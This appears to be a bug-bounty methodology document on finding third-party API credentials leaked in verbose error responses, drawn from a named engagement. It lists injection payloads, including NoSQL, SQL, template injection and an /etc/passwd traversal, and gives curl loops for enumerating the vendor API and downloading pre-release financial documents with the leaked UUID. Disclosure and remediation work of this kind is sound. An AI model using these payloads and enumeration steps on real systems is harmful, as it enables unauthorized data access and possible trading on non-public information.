# Methodology: Third-Party API Credential Disclosure via Verbose Error Responses

**Vulnerability class:** Sensitive Information Disclosure → Broken Access Control  
**CWE:** CWE-209 (Information Exposure Through an Error Message)  
**Typical severity:** Medium–Critical depending on what the leaked credential exposes  
**Derived from:** ANF bug bounty engagement (H1 #4168946, duplicate of #4028172)

---

## Overview

Web applications that act as proxy layers between the user and a third-party backend API frequently leak internal credentials when the downstream API returns an error. The application catches the error and reflects the raw upstream response — including request URLs, API keys, tokens, or UUIDs — back to the caller without sanitization.

The leaked credential then provides unauthenticated direct access to the third-party API, bypassing any controls the proxy layer was meant to enforce.

---

## Pre-Engagement Checklist

Before investing time on a target, run these checks first:

```text
1. site:hackerone.com "<program name>" disclosed reports
2. Search H1 Hacktivity feed for the program directly
3. Check program's disclosed report history for prior Informative closes
   on third-party API scope — a pattern of Informative closes signals
   the program won't pay for vendor-side access control issues
4. Note the program's scope definition for third-party services
```

**Skip deep exploitation if** a prior report on the same surface was closed Informative — that is a program policy signal, not a finding quality issue.

---

## Phase 1 — Surface Discovery

### 1.1 Identify proxy-style endpoints

Look for REST endpoints that:

- Return JSON responses with data that clearly originates from an external source
- Have parameters that map to external API query strings (`type`, `category`, `post`, `feed`, `source`)
- Return data with metadata fields like `executionDate`, `cmsDomain`, `self` links pointing to external hosts
- Are attached to investor relations, news feeds, press releases, events, or social widgets

**Common WordPress patterns:**

```text
/wp-json/{plugin}/v1/{endpoint}
/wp-json/wp/v2/{custom-post-type}
/?rest_route=/{plugin}/{endpoint}
```

**Discovery approach:**

- Browse the target site and capture all REST API calls in Burp Proxy
- Look at page source for JS files making fetch/XHR calls to `/wp-json/` paths
- Run Param Miner on identified endpoints to surface hidden parameters

### 1.2 Fingerprint the backend

Once you have a proxy endpoint returning data, identify what's behind it:

- Look at response field names and structure — vendor-specific field names (e.g., `cmsDomain`, `X-Rq`, `executionDate`) fingerprint the platform
- Check for `self` links in response bodies — these often contain the full backend URL
- Check response headers for vendor signatures
- Google distinctive field names to identify the third-party platform

---

## Phase 2 — Triggering Verbose Errors

### 2.1 Parameter injection to cause downstream errors

The goal is to send a value that passes the WordPress layer but breaks the downstream API, causing it to return an error that the plugin reflects back.

**Payload families to try (in order):**

```text
# NoSQL operator injection — often triggers WAF blocks on downstream APIs
type=[$ne]=1
type=%5B%24ne%5D%3D1          (single URL-encoded)
type=%255b%2524ne%255d%253d1  (double URL-encoded — bypasses some WP sanitization)

# SQL metacharacters
type='
type=1'--
type=1; SELECT 1--

# Template injection
type={{7*7}}
type=${7*7}

# Structural breakage
type[]=1
type={"key":"value"}
type=../../../../etc/passwd
```

**What to look for in responses:**

| Response | Meaning |
| --- | --- |
| HTTP 500 with JSON body containing upstream HTML or URL | Plugin is reflecting raw downstream error — high value |
| HTTP 500 with stack trace | May contain internal paths, credentials, class names |
| HTTP 400 from the WordPress layer | Input validation catching it before it reaches downstream |
| HTTP 406 (nginx, 5 headers) | nginx WAF caught it, never reached the app |
| HTTP 200 but different data/structure | Injection may be affecting query logic |

### 2.2 Extracting the credential from the error response

When a 500 with upstream content is returned, look for:

```json
{
  "code": 403,
  "message": {
    "actual_response": {
      "headers": {},
      "body": "<HTML error from downstream>",
      "url": "https://backend-api.vendor.com/data/{CLIENT-UUID}/endpoint?param=..."
    }
  }
}
```

The credential (UUID, API key, token) is typically in:

- The `url` field of the upstream request
- The `body` of the upstream response (sometimes reflected in error messages)
- Request headers that the plugin forwarded and then included in its error log

---

## Phase 3 — Exploiting the Leaked Credential

### 3.1 Direct API access

Take the backend URL from the error response and hit it directly with no authentication headers:

```bash
curl -s "https://backend-api.vendor.com/data/{UUID}/endpoint" | jq .
```

**What to enumerate:**

```text
/{uuid}/news
/{uuid}/assets
/{uuid}/events
/{uuid}/press-releases
/{uuid}/presentations
/{uuid}/financials
/{uuid}/sec-filings
/{uuid}/governance
/{uuid}/ir-calendar
/{uuid}/users          # if applicable
/{uuid}/admin          # if applicable
```

### 3.2 Enumerate all records and pages

```bash
# Check pagination
curl -s "https://backend-api.vendor.com/data/{UUID}/news" | jq '.links'

# Iterate pages
for i in $(seq 1 10); do
  curl -s "https://backend-api.vendor.com/data/{UUID}/news?page=$i" \
    -o "news-page${i}.json"
done
```

### 3.3 Extract direct download URLs

Look inside each record for document URLs:

```bash
cat assets.json | jq '.data[].documents[].url'
```

Download a sample to prove access:
```bash
curl -L -o exhibit_a.pdf "https://files.vendor.com/static-files/{document-uuid}"
```

---

## Phase 4 — MNPI / Sensitive Data Assessment

This phase applies when the target is a public company and the leaked API exposes financial documents.

### 4.1 Identify the asset type

Assess whether documents include:

- Earnings releases, quarterly financial statements
- Investor presentations, earnings call scripts
- Balance sheets, income statements, cash flow statements
- SEC filings before EDGAR publication

### 4.2 Check for pre-staging (the critical timestamp check)

This is the difference between "public data via alternate path" (low impact) and "pre-release MNPI access" (Critical):

```bash
# For each financial document asset, compare:
cat asset_{id}.json | jq '{
  id: .data.id,
  title: .data.title,
  createdOnUTC: .data.createdOnUTC,
  lastUpdatedUTC: .data.lastUpdatedUTC,
  publicReleaseDate: .data.date
}'
```

**If `createdOnUTC` is earlier than `date` (public release date):**

- Calculate the delta in days
- Document it as the confirmed pre-release access window
- This is proven MNPI exposure, not theoretical

**Example finding:**
```
Asset 26796 — Q2 2026 Earnings Financials
createdOnUTC:  2026-08-21T20:15:53   ← uploaded to CMS
releaseDate:   2026-08-26            ← public release
Pre-release window: 5 days
```

### 4.3 Assess forward-looking risk

Check for upcoming earnings dates:

- Look at the most recent news items for "to Report [Quarter] Results on [Date]" announcements
- If an earnings release is within 30 days, documents may be pre-staged soon
- Document the upcoming date in the report as a time-sensitive escalation factor

---

## Phase 5 — Ruling Out False Positives

### Time-based injection — always verify with control requests

When testing time-based payloads on image/file processing endpoints:

```text
1. Run the payload (e.g., sleep 5) 3+ times
2. Record ALL response times AND X-Cache header values
3. Run a control (benign parameter) 3+ times
4. Check Content-Type and Content-Length in both sets
```

**Red flags that indicate false positive (not real execution):**

- Cache HITs still showing the full "sleep" delay → delay is in transfer, not execution
- `X-Optim-Disabled: true` appears → CDN bypassed, serving raw file (larger, slower)
- `while(true){}` payload resolves in <2s → not being eval'd
- File size difference between test and control explains the timing delta
- Same ETag and Last-Modified across multiple runs → cached, no re-execution

**The definitive test for JS injection on image endpoints:**

```text
Payload A: sleep(5)         → note response time
Payload B: while(true){}   → if this resolves in <5s, nothing is being executed
```

An infinite loop that completes is the strongest single indicator that the input is not reaching an interpreter.

---

## Phase 6 — Report Writing

### CVSS 3.1 scoring for this vulnerability class

**Base case (UUID disclosure → public data only):**

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:N/A:N = 8.6 (High)
```

**Escalated case (UUID disclosure → confirmed pre-release MNPI access):**

```text
CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:H/I:L/A:N = 9.3 (Critical)
I:L reflects documented market integrity impact from pre-release financial document access
```

| Metric | Value | Notes |
| --- | --- | --- |
| AV | Network | Fully remote, standard HTTP |
| AC | Low | No special conditions |
| PR | None | No account required |
| UI | None | Attacker acts alone |
| S | Changed | Vuln in app layer; impact on separate vendor API |
| C | High | Complete read access to IR document repository |
| I | Low/None | Low if MNPI pre-staging confirmed; None if all data is public |
| A | None | Read-only access |

### Report framing

**Do not call this SSRF.** The app always calls a fixed external vendor — the attacker cannot redirect the outbound request to an arbitrary host. Correct labels:

- **Root cause:** Sensitive Information Disclosure (CWE-209) — verbose error response leaks backend credential
- **Impact:** Broken Access Control — third-party API accessible with leaked credential as sole auth

**Impact statement structure:**

1. State what the credential provides access to (API, endpoints, record count)
2. State whether accessed documents are public or non-public
3. If pre-staging confirmed: state the specific asset IDs, `createdOnUTC`, `releaseDate`, and delta
4. If upcoming earnings: state the date and explain the forward-looking risk
5. Attach a downloaded document as Exhibit A (redact sensitive numbers if disclosing publicly)
6. Attach the asset JSON records with timestamps as Exhibit B

**What not to overclaim:**

- Don't label it MNPI if you only have public documents and no timestamp evidence of pre-staging
- Don't claim NoSQL injection if `$ne` broke a WAF rule — the backend probably isn't MongoDB
- Don't call the UUID "rotatable" if it's permanent — verify what rotation would require

---

## Remediation Guidance (to include in reports)

**Immediate:**
1. Do not upload upcoming earnings documents until credential is rotated
2. Contact vendor to rotate the client UUID/credential

**Short-term (root cause fix):**
3. Strip upstream error body and URL from all error responses to callers
4. Return generic error messages on upstream failure
5. Validate all user-supplied parameters against explicit allowlists before forwarding

**Medium-term:**
6. Replace permanent UUID auth with per-request scoped tokens with short expiry
7. Audit all other third-party proxy endpoints on the same application for the same pattern

---

## Indicators This Pattern Exists on a Target

- WordPress with investor relations, news, or press release widgets
- REST endpoints returning JSON with `executionDate`, `cmsDomain`, `self` link fields
- Response bodies containing `links.self` pointing to a different domain than the target
- `X-Cache: BYPASS` on API responses (bypassing CDN, hitting origin directly)
- 500 errors with `Content-Type: application/json` on parameter fuzzing
- Third-party IR platforms: GCS Web / Q4 Inc, Notified (formerly PR Newswire), Businesswire, Globe Newswire embedded widgets, Nasdaq IR, Broadridge

---

## Tools Used in This Engagement

| Tool | Purpose |
| --- | --- |
| Burp Suite Professional | Proxy, Repeater, Param Miner extension |
| curl / browser | Direct API enumeration without proxy overhead |
| Python `json` / `jq` | Parsing and analyzing enumerated JSON responses |
| Burp Inspector | URL-decoding payloads to verify what's actually being sent |

---

*Last updated: 2026-11-03*  
*Source engagement: Abercrombie & Fitch (corporate.abercrombie.com) — H1 #4168946*
